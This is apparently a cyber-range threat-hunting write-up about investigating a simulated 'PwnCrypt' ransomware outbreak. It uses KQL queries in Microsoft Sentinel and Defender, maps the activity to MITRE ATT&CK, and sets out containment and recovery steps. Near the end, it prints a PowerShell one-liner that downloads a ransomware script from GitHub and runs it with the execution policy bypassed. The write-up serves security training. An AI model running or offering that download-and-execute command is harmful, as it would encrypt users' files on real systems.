
---

## **Incident Response Plan: Zero-Day Ransomware (PwnCrypt) Outbreak**  

![image (11)](https://github.com/user-attachments/assets/abe54490-9d72-416b-8e9c-ac8746484da3)

### **Scenario**  
A new ransomware strain, **PwnCrypt**, has emerged. It utilizes a PowerShell-based payload to encrypt files, appending `.pwncrypt` to filenames (e.g., `hello.txt → hello.pwncrypt.txt`). The payload is downloaded using `Invoke-WebRequest` via PowerShell and targets specific directories like `C:\Users\Public\Desktop`. The CISO has raised concerns, and immediate investigation is required.  
 
## Platforms and Languages Leveraged
- Microsoft Sentinel
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
---

### **1. Preparation**  
**Goal:** Develop a hypothesis based on threat intelligence and organizational gaps.  
- The organization's immature security program (e.g., no user training) may have allowed ransomware into the network.  
- Use known IoCs, such as `.pwncrypt` file extensions, to guide the investigation.  

**Hypothesis:** Could PwnCrypt have spread laterally across the network?  

---

### **2. Data Collection**  
**Goal:** Gather logs and evidence from endpoints, file systems, and network traffic.  

#### **Suspicious PowerShell Command Query:** 
```kql
DeviceFileEvents
| top 20 by Timestamp desc
```
```kql
DeviceNetworkEvents
| top 20 by Timestamp desc
```
```kql
DeviceProcessEvents
| top 20 by Timestamp desc
```

```kql
DeviceProcessEvents
| where DeviceName == "marcels-vm"
| where ProcessCommandLine has "Invoke-WebRequest" and ProcessCommandLine has "pwncrypt.ps1"
| project Timestamp, DeviceName, InitiatingProcessParentFileName, ProcessCommandLine, AccountName
```
![image](https://github.com/user-attachments/assets/2e06b655-090f-4a71-bd0b-56dd7eb47a29)


#### **Trace Ransomware Execution:**  
```kql
DeviceProcessEvents
| where DeviceName == "marcels-vm"
| where ProcessCommandLine has "C:\\programdata\\pwncrypt.ps1" or FileName == "powershell.exe"
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, AccountName, InitiatingProcessAccountName
```
![image](https://github.com/user-attachments/assets/531ce4ca-5db8-477e-b3ad-ee7471fe17df)


#### **Outbound Network Activity:**  
```kql
DeviceNetworkEvents
| where RemoteUrl has "githubusercontent.com"
| project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessCommandLine, AccountName
```
![Screenshot 2025-01-09 114155](https://github.com/user-attachments/assets/3dad1d63-ddbf-4790-a3b4-e8853f253314)

---

### **3. Data Analysis**  
**Goal:** Examine data for anomalies, patterns, and IoCs.  

**Indicators Found:**  
- **PowerShell Usage:** Execution of `pwncrypt.ps1` via `Invoke-WebRequest`.  
- **Outbound Traffic:** Connection to GitHub for payload download.  
- **File Events:** Creation of `.pwncrypt` files in user directories.  

**TTPs Mapped to MITRE ATT&CK Framework:**  
- **T1059.001**: Command and Scripting Interpreter (PowerShell).  
- **T1486**: Data Encrypted for Impact (Ransomware).  
- **T1105**: Ingress Tool Transfer (Downloading payloads).  
- **T1547**: Boot/Logon Autostart Execution (Persistence).  

---

### **4. Investigation**  
**Goal:** Deep dive into findings and assess the threat's scope.  

#### **Steps:**  
1. Check **DeviceFileEvents** for `.pwncrypt` file creation.  
2. Investigate process lineage in **DeviceProcessEvents** to identify the initial infection vector.  
3. Analyze account activity for potential compromise.  

---

### **5. Response**  
**Goal:** Contain and mitigate confirmed threats.  

#### **Containment:**  
- Disconnect affected devices from the network.  
- Block known malicious IPs and domains.  

#### **Eradication:**  
- Remove `pwncrypt.ps1` and terminate related processes.  
- Scan endpoints for persistence mechanisms (e.g., scheduled tasks).  

#### **Recovery:**  
- Restore data from **clean backups**.  
- Verify integrity of restored systems.  

---

### **6. Documentation**  
📌 **Goal:** Record findings and actions taken.  

**What to Document:**  
- Timeline of events.  
- IoCs identified (e.g., `.pwncrypt` files, GitHub URLs).  
- Steps for containment, eradication, and recovery.  
- Gaps in security posture and recommendations for improvement.  

---

### **7. Improvement**  
**Goal:** Enhance the organization’s defenses against future incidents.  

#### **Action Plan:**  
1. Deploy **endpoint protection policies**.  
2. Implement **user training** to identify phishing attempts.  
3. Strengthen **logging and monitoring** to detect suspicious behavior earlier.  

---

### **Ransomware Command Snapshot**  
Example of how the ransomware script was executed:  
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

**Incident Start Time:**  
- **Date:** Jan 09, 2025  
- **Time:** 9:45 AM  
- **IP:** 185.199.111.133  

---
